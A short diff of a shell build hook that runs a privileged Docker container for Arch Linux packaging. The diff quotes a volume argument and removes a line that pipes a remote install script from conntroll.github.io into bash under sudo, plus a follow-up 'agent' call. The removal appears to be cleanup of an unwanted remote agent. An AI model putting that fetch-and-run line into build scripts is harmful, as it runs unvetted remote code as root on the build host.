@@ -23,7 +23,7 @@ update_docker_image(){
   -e "VARIANT=${VARIANT:-base}" \
   -w "$PWD" \
   -v /var/run:/var/run \
-  -v ${PKGDIR:-$PWD/cache-${ARCH}}:/var/cache/pacman/pkg \
+  -v "${PKGDIR:-$PWD/cache-${ARCH}}:/var/cache/pacman/pkg" \
   --privileged \
   --net=host \
   latestarch/linux:stable \
@@ -32,9 +32,6 @@ update_docker_image(){
 
 main(){
   echo "------ HOOK START - BUILD -------"
-  curl https://conntroll.github.io/install.sh | $sudo bash -v
-  agent
-
   update_docker_image
   echo "------ HOOK END - BUILD -------"
 }
